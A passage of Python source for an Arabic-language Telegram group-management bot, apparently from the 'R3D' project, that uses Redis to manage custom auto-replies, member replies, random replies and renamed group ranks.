      r.set(f'{text}:filterInfo:{m.chat.id}{Dev_Zaid}', f'by={m.from_user.id}&date={date}')
      r.sadd(f'{m.chat.id}:FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.document and r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
      type = 'doc'
      doc = m.document.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}{m.chat.id}', f'type={type}&doc={doc}&caption={caption}')
      r.set(f'{text}:filtertype:{m.chat.id}{Dev_Zaid}','ملف')
      r.set(f'{text}:filterInfo:{m.chat.id}{Dev_Zaid}', f'by={m.from_user.id}&date={date}')
      r.sadd(f'{m.chat.id}:FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.sticker and r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id, m.chat.id):
      type = 'sticker'
      stic = m.sticker.file_id
      text = r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}{m.chat.id}', f'type={type}&sticker={stic}')
      r.set(f'{text}:filtertype:{m.chat.id}{Dev_Zaid}','ستيكر')
      r.set(f'{text}:filterInfo:{m.chat.id}{Dev_Zaid}', f'by={m.from_user.id}&date={date}')
      r.sadd(f'{m.chat.id}:FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   

@Client.on_message(filters.text & filters.group, group=22)
def addCustomReply(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=addreply,args=(c,m,k)).start()
    
def addreply(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return    
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   if r.get(f'{m.chat.id}:addFilter:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addFilter:{m.from_user.id}{Dev_Zaid}')
     m.reply(f'{k} من عيوني لغيت اضافة الرد')
     return 
   
   if r.get(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}')
     m.reply(f'{k} من عيوني لغيت مسح الرد')
     return 

   if r.get(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id,m.chat.id):
      if not r.get(f'{m.text}:filterInfo:{m.chat.id}{Dev_Zaid}'):
        r.delete(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}')
        return m.reply(f'{k} هذا الرد مو مضاف في قائمة الردود')
      else:
           r.delete(f'{m.text}:filter:{Dev_Zaid}{m.chat.id}')
           r.delete(f'{m.text}:filtertype:{m.chat.id}{Dev_Zaid}')
           r.delete(f'{m.text}:filterInfo:{m.chat.id}{Dev_Zaid}')
           r.srem(f'{m.chat.id}:FiltersList:{Dev_Zaid}', m.text)
           r.delete(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}')
           return m.reply(f'( {m.text} )\n{k} وحذفنا الرد ياحلو')

   if r.get(f'{m.chat.id}:addFilter:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id,m.chat.id):
      r.set(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}', m.text)
      r.delete(f'{m.chat.id}:addFilter:{m.from_user.id}{Dev_Zaid}')
      m.reply(f'{k} حلو الحين ارسل جواب الرد\n{k} ( نص,صوره,فيديو,متحركه,بصمه,صوت,ملف )\nـــــــــــــــــــــــــــــــــــــــــ\n`<USER_ID>` › آيدي المستخدم\n`<USER_NAME>` › اسم المستخدم\n`<USER_USERNAME>` › يوزر المستخدم\n`<USER_MENTION>` › رابط حساب المستخدم\n༄',parse_mode=ParseMode.MARKDOWN)
      return 

   if text.startswith('الرد ') and len(m.text.split()) > 1 and mod_pls(m.from_user.id,m.chat.id):
      reply = m.text.split(None,1)[1]
      if not r.get(f'{reply}:filterInfo:{m.chat.id}{Dev_Zaid}'):
        return m.reply(f'{k} الرد مو مضاف')
      else:
        get = r.get(f'{reply}:filterInfo:{m.chat.id}{Dev_Zaid}')
        split = get.split('by=')[1]
        by = split.split('&date=')[0]
        date = split.split('&date=')[1]
        type = r.get(f'{reply}:filtertype:{m.chat.id}{Dev_Zaid}')
        text = f'{k} الرد ↢ [{reply}](tg://user?id={by})\n{k} تاريخ الاضافة ↢\n( {date} )\n{k} نوع الرد {type}\n☆'
        m.reply(text)
        return 
   
   if text == 'تعطيل الردود':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     if r.get(f'{m.chat.id}:lock_filter:{Dev_Zaid}'):
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} الردود معطله من قبل\n☆',parse_mode=ParseMode.HTML)
     else:
        r.set(f'{m.chat.id}:lock_filter:{Dev_Zaid}',1)
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الردود\n☆',parse_mode=ParseMode.HTML)
   
   if text == 'تفعيل الردود':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     if not r.get(f'{m.chat.id}:lock_filter:{Dev_Zaid}'):
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} الردود مفعله من قبل\n☆',parse_mode=ParseMode.HTML)
     else:
        r.delete(f'{m.chat.id}:lock_filter:{Dev_Zaid}')
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الردود\n☆',parse_mode=ParseMode.HTML)
  
   if text == 'تعطيل ردود الاعضاء':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     if r.get(f'{m.chat.id}:lock_filterMEM:{Dev_Zaid}'):
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ردود الاعضاء معطله من قبل\n☆',parse_mode=ParseMode.HTML)
     else:
        r.set(f'{m.chat.id}:lock_filterMEM:{Dev_Zaid}',1)
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت ردود الاعضاء\n☆',parse_mode=ParseMode.HTML)
   
   if text == 'تفعيل ردود الاعضاء':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     if not r.get(f'{m.chat.id}:lock_filterMEM:{Dev_Zaid}'):
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ردود الاعضاء مفعله من قبل\n☆',parse_mode=ParseMode.HTML)
     else:
        r.delete(f'{m.chat.id}:lock_filterMEM:{Dev_Zaid}')
        return m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت ردود الاعضاء\n☆',parse_mode=ParseMode.HTML)
   
   if text == 'ردود الاعضاء':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
      if not r.smembers(f'{m.chat.id}:FiltersListMEM:{Dev_Zaid}'):
       return m.reply(f'{k} مافيه ردود اعضاء مضافه')
      else:
       text = 'ردود الاعضاء:\n'
       count = 1
       for reply in r.smembers(f'{m.chat.id}:FiltersListMEM:{Dev_Zaid}'):
          rep = reply.split("&&&&")[0]
          type = reply.split("&&&&")[1]
          try:
            mention=c.get_users(int(type)).mention
          except:
            mention=f'<a href="tg://user?id={type}">{type}</a>'
          text += f'\n{count} - ( {rep} ) ࿓ ( {mention} )'
          count += 1
       text += '\n☆'
       return m.reply(text, disable_web_page_preview=True,parse_mode=ParseMode.HTML)
   
   if text == 'مسح ردود الاعضاء':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
      if not r.smembers(f'{m.chat.id}:FiltersListMEM:{Dev_Zaid}'):
        return m.reply(f'{k} مافيه ردود اعضاء مضافه')
      else:
        total = 0
        for reply in r.smembers(f'{m.chat.id}:FiltersListMEM:{Dev_Zaid}'):
           rep = reply
           r.delete(f'{rep}:filterMEM:{Dev_Zaid}{m.chat.id}')
           r.srem(f'{m.chat.id}:FiltersListMEM:{Dev_Zaid}', rep)
           r.delete(f"{rep.split('&&&&')[1]}:FILT:{m.chat.id}{Dev_Zaid}")
           total += 1
        return m.reply(f'{k} ابشر مسحت ( {total} ) من ردود الاعضاء')
   
   if text == 'الردود':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
      if not r.smembers(f'{m.chat.id}:FiltersList:{Dev_Zaid}'):
       return m.reply(f'{k} مافيه ردود مضافه')
      else:
       text = 'ردود المجموعه:\n'
       count = 1
       for reply in r.smembers(f'{m.chat.id}:FiltersList:{Dev_Zaid}'):
          rep = reply
          type = r.get(f'{rep}:filtertype:{m.chat.id}{Dev_Zaid}')
          text += f'\n{count} - ( {rep} ) ࿓ ( {type} )'
          count += 1
       text += '\n☆'
       return m.reply(text, disable_web_page_preview=True,parse_mode=ParseMode.HTML)
  
   if text == 'مسح الردود':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
      if not r.smembers(f'{m.chat.id}:FiltersList:{Dev_Zaid}'):
        return m.reply(f'{k} مافيه ردود مضافه')
      else:
        total = 0
        for reply in r.smembers(f'{m.chat.id}:FiltersList:{Dev_Zaid}'):
           rep = reply
           r.delete(f'{rep}:filter:{Dev_Zaid}{m.chat.id}')
           r.delete(f'{rep}:filtertype:{m.chat.id}{Dev_Zaid}')
           r.delete(f'{rep}:filterInfo:{m.chat.id}{Dev_Zaid}')
           r.srem(f'{m.chat.id}:FiltersList:{Dev_Zaid}', rep)
           total += 1
        return m.reply(f'{k} ابشر مسحت ( {total} ) من الردود')
   
   if text == 'اضف ردي':
      if r.get(f'{m.chat.id}:lock_filterMEM:{Dev_Zaid}'):
        return m.reply(f'{k} تم تعطيل ردود الأعضاء')
      if r.get(f"{m.from_user.id}:FILT:{m.chat.id}{Dev_Zaid}"):
        name = r.get(f"{m.from_user.id}:FILT:{m.chat.id}{Dev_Zaid}")
        return m.reply(f"{k} عندك رد مضاف من قبل و هو ( {name} )")
      else:
        m.reply(f'{k} حلو ، الحين ارسل اسمك')
        r.set(f'{m.chat.id}:addFilterMM:{m.from_user.id}{Dev_Zaid}',1,ex=600)
        return 
   
   if r.get(f'{m.chat.id}:addFilterMM:{m.from_user.id}{Dev_Zaid}') and text == "الغاء":
     r.delete(f'{m.chat.id}:addFilterMM:{m.from_user.id}{Dev_Zaid}')
     return m.reply(f"{k} ابشر لغيت اضافة ردك")
     
   
   if r.get(f'{m.chat.id}:addFilterMM:{m.from_user.id}{Dev_Zaid}') and len(m.text) <= 50:
     name = m.text
     if r.sismember(f'{m.chat.id}:FiltersListMEM:{Dev_Zaid}',name):
       return m.reply(f"{k} هذا الإسم محجوز")
     else:
       r.sadd(f'{m.chat.id}:FiltersListMEM:{Dev_Zaid}',f"{name}&&&&{m.from_user.id}")
       r.sadd(f'{m.chat.id}:FiltersListMEMM:{Dev_Zaid}',m.from_user.id)
       r.set(f'{name}:filterMEM:{Dev_Zaid}{m.chat.id}',m.from_user.id)
       r.set(f"{m.from_user.id}:FILT:{m.chat.id}{Dev_Zaid}",name)
       r.delete(f'{m.chat.id}:addFilterMM:{m.from_user.id}{Dev_Zaid}')
       return m.reply(f"{k} ابشر ضفت ردك ( {name} )")
   
   if text == 'مسح ردي':
     if r.get(f"{m.from_user.id}:FILT:{m.chat.id}{Dev_Zaid}"):
       rep=r.get(f"{m.from_user.id}:FILT:{m.chat.id}{Dev_Zaid}")
       r.delete(f'{rep}:filterMEM:{Dev_Zaid}{m.chat.id}')
       r.srem(f'{m.chat.id}:FiltersListMEM:{Dev_Zaid}', f"{rep}&&&&{m.from_user.id}")
       r.delete(f"{m.from_user.id}:FILT:{m.chat.id}{Dev_Zaid}")
       return m.reply(f"{k} ابشر مسحت ردك ( {rep} )")
     else:
       return m.reply(f"{k} ماعندك رد")
        
   if text == 'اضف رد':
     if not r.get(f'{m.chat.id}:addFilter:{m.from_user.id}{Dev_Zaid}'):
      if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
      else:
        m.reply(f'{k} حلو ، الحين ارسل الكلمة اللي تبيها')
        r.set(f'{m.chat.id}:addFilter:{m.from_user.id}{Dev_Zaid}',1)
        return 
        
   if text == 'مسح رد':
     if not r.get(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}'):
      if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
      else:
        r.set(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}',1)
        m.reply(f'{k} تمام عيني\n{k} الحين ارسل الرد عشان امسحه\n☆',parse_mode=ParseMode.HTML)
        return 
   
   
   
   
   

   

@Client.on_message(filters.group & filters.text, group=23)
def addCustomReplyRandom(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=addreplyrandom,args=(c,m,k)).start()
   

def addreplyrandom(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   
   if isLockCommand(m.from_user.id, m.chat.id, text): return

   if r.get(f'{m.chat.id}:addFilterR:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addFilterR:{m.from_user.id}{Dev_Zaid}')
     m.reply(f'{k} من عيوني لغيت اضافة الرد المميز')
     return 
   
   if r.get(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     rep = r.get(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}')
     r.delete(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}')
     r.delete(f'{rep}:randomfilter:{m.chat.id}{Dev_Zaid}')
     m.reply(f'{k} من عيوني لغيت اضافه الرد المميز')
     return 
     
   if r.get(f'{m.chat.id}:delFilterR:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:delFilterR:{m.from_user.id}{Dev_Zaid}')
     return m.reply(f'{k} من عيوني لغيت مسح الرد المميز')
   
   if r.get(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}') and text == 'تم':
     text = r.get(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}')
     count = len(r.smembers((f'{text}:randomfilter:{m.chat.id}{Dev_Zaid}')))
     r.set(f'{text}:randomFilter:{m.chat.id}{Dev_Zaid}', 1)
     r.sadd(f'{m.chat.id}:RFiltersList:{Dev_Zaid}', text)
     r.delete(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}')
     return m.reply(f'{k} تم اضافه الرد المميز ( {text} )\n{k} بـ ( {count} ) جواب رد\n☆',parse_mode=ParseMode.HTML)
   
   if r.get(f'{m.chat.id}:delFilterR:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id,m.chat.id):
     if not r.get(f'{m.text}:randomFilter:{m.chat.id}{Dev_Zaid}'):
       r.delete(f'{m.chat.id}:delFilterR:{m.from_user.id}{Dev_Zaid}')
       return m.reply(f'{k} هذا الرد مو مضاف في قائمة الردود')
     else:
       r.delete(f'{m.text}:randomFilter:{m.chat.id}{Dev_Zaid}')
       r.delete(f'{m.text}:randomfilter:{m.chat.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:delFilterR:{m.from_user.id}{Dev_Zaid}')
       r.srem(f'{m.chat.id}:RFiltersList:{Dev_Zaid}',m.text)
       return m.reply(f'{k} ابشر مسحت الرد العشوائي ')
       
   
   if r.get(f'{m.chat.id}:addFilterR:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id,m.chat.id):
     r.delete(f'{m.chat.id}:addFilterR:{m.from_user.id}{Dev_Zaid}')
     r.set(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}',m.text)
     return m.reply(f'{k} حلو الحين ارسل اجوبة الرد\n{k} بس تخلص ارسل تم\nـــــــــــــــــــــــــــــــــــــــــ\n`<USER_ID>` › آيدي المستخدم\n`<USER_NAME>` › اسم المستخدم\n`<USER_USERNAME>` › يوزر المستخدم\n`<USER_MENTION>` › رابط حساب المستخدم\n༄',parse_mode=ParseMode.MARKDOWN)
   
   if r.get(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}') and mod_pls(m.from_user.id,m.chat.id):
     text = r.get(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}')
     r.sadd(f'{text}:randomfilter:{m.chat.id}{Dev_Zaid}', m.text.html)
     return m.reply(f'{k} حلو ضفت هذا الرد\n{k} بس تخلص ارسل تم\nـــــــــــــــــــــــــــــــــــــــــ\n`<USER_ID>` › آيدي المستخدم\n`<USER_NAME>` › اسم المستخدم\n`<USER_USERNAME>` › يوزر المستخدم\n`<USER_MENTION>` › رابط حساب المستخدم\n༄',parse_mode=ParseMode.MARKDOWN)
     
   if text == 'الردود المميزه':
     if not mod_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
      if not r.smembers(f'{m.chat.id}:RFiltersList:{Dev_Zaid}'):
       return m.reply(f'{k} مافيه ردود عشوائيه مضافه')
      else:
       text = 'الردود المميزه:\n'
       count = 1
       for reply in r.smembers(f'{m.chat.id}:RFiltersList:{Dev_Zaid}'):
          rep = reply
          ttt = len(r.smembers(f'{rep}:randomfilter:{m.chat.id}{Dev_Zaid}'))
          text += f'\n{count} - ( {rep} ) ☆ ( {ttt} )'
          count += 1
       text += '\n☆'
       return m.reply(text, disable_web_page_preview=True,parse_mode=ParseMode.HTML)
   
   if text == 'مسح الردود المميزه':
     if not mod_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
       if not r.smembers(f'{m.chat.id}:RFiltersList:{Dev_Zaid}'):
         return m.reply(f'{k} مافيه ردود مميزه مضافه')
       else:
         count = 0
         for reply in r.smembers(f'{m.chat.id}:RFiltersList:{Dev_Zaid}'):
            rep = reply
            r.delete(f'{rep}:randomfilter:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:RFiltersList:{Dev_Zaid}', rep)
            r.delete(f'{rep}:randomFilter:{m.chat.id}{Dev_Zaid}')
            count += 1
         return m.reply(f'{k} ابشر مسحت ( {count} ) رد مميز ')
            
   if text == 'اضف رد مميز' and not r.get(f'{m.chat.id}:addFilterR:{m.from_user.id}{Dev_Zaid}') and not r.get(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}'):
     if not mod_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
       r.set(f'{m.chat.id}:addFilterR:{m.from_user.id}{Dev_Zaid}',1)
       return m.reply(f'{k} حلو ، ارسل الحين الكلمة الي تبيها')
   
   if text == 'مسح رد مميز' and not r.get(f'{m.chat.id}:delFilterR:{m.from_user.id}{Dev_Zaid}'):
     if not mod_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( المدير وفوق ) بس')
     else:
       r.set(f'{m.chat.id}:delFilterR:{m.from_user.id}{Dev_Zaid}',1)
       return m.reply(f'{k} تمام عيني\n{k} الحين ارسل الرد عشان امسحه\n☆',parse_mode=ParseMode.HTML)
   
   
     
     
     

# ==================== FILE: customRank.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''



@Client.on_message(filters.text & filters.group, group=35)
def customrankHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=customRankFunc,args=(c,m,k,channel)).start()
    
def customRankFunc(c,m,k,channel):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return  
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   if isLockCommand(m.from_user.id, m.chat.id, text): return
   if text == 'الغاء':
     if r.get(f'{m.from_user.id}:addRank2:{m.chat.id}{Dev_Zaid}') or r.get(f'{m.from_user.id}:addRank:{m.chat.id}{Dev_Zaid}') or r.get(f'{m.from_user.id}:delRank:{m.chat.id}{Dev_Zaid}'):
        m.reply(f'{k} من عيوني لغيت كل شي يخص الرتب')
        r.delete(f'{m.from_user.id}:addRank:{m.chat.id}{Dev_Zaid}')
        r.delete(f'{m.from_user.id}:delRank:{m.chat.id}{Dev_Zaid}')
        r.delete(f'{m.from_user.id}:addRank2:{m.chat.id}{Dev_Zaid}')
   
   if r.get(f'{m.from_user.id}:addRank2:{m.chat.id}{Dev_Zaid}') and mod_pls(m.from_user.id,m.chat.id) and len(m.text) <= 20:
     rank = r.get(f'{m.from_user.id}:addRank2:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{m.from_user.id}:addRank2:{m.chat.id}{Dev_Zaid}')
     if rank == 'مالك اساسي':
       if r.get(f'{m.chat.id}:RankGowner:{Dev_Zaid}'):
         rrr = r.get(f'{m.chat.id}:RankGowner:{Dev_Zaid}')
         r.srem(f'{m.chat.id}:ranklist:{Dev_Zaid}',f'{rank}&&newr={rrr}')
         r.delete(f'{m.chat.id}:RankGowner:{Dev_Zaid}')
       r.set(f'{m.chat.id}:RankGowner:{Dev_Zaid}',m.text)
     if rank == 'مالك':
       if r.get(f'{m.chat.id}:RankOwner:{Dev_Zaid}'):
         rrr = r.get(f'{m.chat.id}:RankOwner:{Dev_Zaid}')
         r.srem(f'{m.chat.id}:ranklist:{Dev_Zaid}',f'{rank}&&newr={rrr}')
         r.delete(f'{m.chat.id}:RankOwner:{Dev_Zaid}')
       r.set(f'{m.chat.id}:RankOwner:{Dev_Zaid}',m.text)
     if rank == 'مدير':
       if r.get(f'{m.chat.id}:RankMod:{Dev_Zaid}'):
         rrr = r.get(f'{m.chat.id}:RankMod:{Dev_Zaid}')
         r.srem(f'{m.chat.id}:ranklist:{Dev_Zaid}',f'{rank}&&newr={rrr}')
         r.delete(f'{m.chat.id}:RankMod:{Dev_Zaid}')     
       r.set(f'{m.chat.id}:RankMod:{Dev_Zaid}',m.text)
     if rank == 'ادمن':
       if r.get(f'{m.chat.id}:RankAdm:{Dev_Zaid}'):
         rrr = r.get(f'{m.chat.id}:RankAdm:{Dev_Zaid}')
         r.srem(f'{m.chat.id}:ranklist:{Dev_Zaid}',f'{rank}&&newr={rrr}')
         r.delete(f'{m.chat.id}:RankAdm:{Dev_Zaid}')     
       r.set(f'{m.chat.id}:RankAdm:{Dev_Zaid}',m.text)
     if rank == 'مميز':
       if r.get(f'{m.chat.id}:RankPre:{Dev_Zaid}'):
         rrr = r.get(f'{m.chat.id}:RankPre:{Dev_Zaid}')
         r.srem(f'{m.chat.id}:ranklist:{Dev_Zaid}',f'{rank}&&newr={rrr}')
         r.delete(f'{m.chat.id}:RankPre:{Dev_Zaid}')     
       r.set(f'{m.chat.id}:RankPre:{Dev_Zaid}',m.text)
     if rank == 'عضو':
       if r.get(f'{m.chat.id}:RankMem:{Dev_Zaid}'):
         rrr = r.get(f'{m.chat.id}:RankMem:{Dev_Zaid}')
         r.srem(f'{m.chat.id}:ranklist:{Dev_Zaid}',f'{rank}&&newr={rrr}')
         r.delete(f'{m.chat.id}:RankMem:{Dev_Zaid}')     
       r.set(f'{m.chat.id}:RankMem:{Dev_Zaid}',m.text)
     r.sadd(f'{m.chat.id}:ranklist:{Dev_Zaid}',f'{rank}&&newr={m.text}')  
     return m.reply(f'{k} تم غيرت الرتبه الى ( {m.text} )')
       
   
   if r.get(f'{m.from_user.id}:addRank:{m.chat.id}{Dev_Zaid}') and mod_pls(m.from_user.id,m.chat.id):
     r.delete(f'{m.from_user.id}:addRank:{m.chat.id}{Dev_Zaid}')
     if not m.text in ['مالك اساسي','مالك','مدير','ادمن','مميز','عضو']:
       return m.reply(f'{k} ركز! الرتبه اللي كتبتها مو موجوده')
     else:
       r.set(f'{m.from_user.id}:addRank2:{m.chat.id}{Dev_Zaid}',m.text,ex=600)
       return m.reply(f'{k} حلو الحين ارسل الرتبه الجديدة')
   
   if r.get(f'{m.from_user.id}:delRank:{m.chat.id}{Dev_Zaid}') and mod_pls(m.from_user.id,m.chat.id):
     r.delete(f'{m.from_user.id}:delRank:{m.chat.id}{Dev_Zaid}')
     if not m.text in ['مالك اساسي','مالك','مدير','ادمن','مميز','عضو']:
       return m.reply(f'{k} مافي رتبه زي كذا لازم تكتب الرتبه الاساسيه مثال مالك اساسي مو {m.text[:20]}')
     else:
       rank = m.text
       if rank == 'مالك اساسي':
         rank2 = r.get(f'{m.chat.id}:RankGowner:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankGowner:{Dev_Zaid}')
       if rank == 'مالك':
         rank2 = r.get(f'{m.chat.id}:RankOwner:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankOwner:{Dev_Zaid}')
       if rank == 'مدير':
         rank2 = r.get(f'{m.chat.id}:RankMod:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankMod:{Dev_Zaid}')
       if rank == 'ادمن':
         rank2 = r.get(f'{m.chat.id}:RankAdm:{Dev_Zaid}')
         r.delete(f'{m.chat.id}:RankAdm:{Dev_Zaid}')
       if rank == 'مميز':
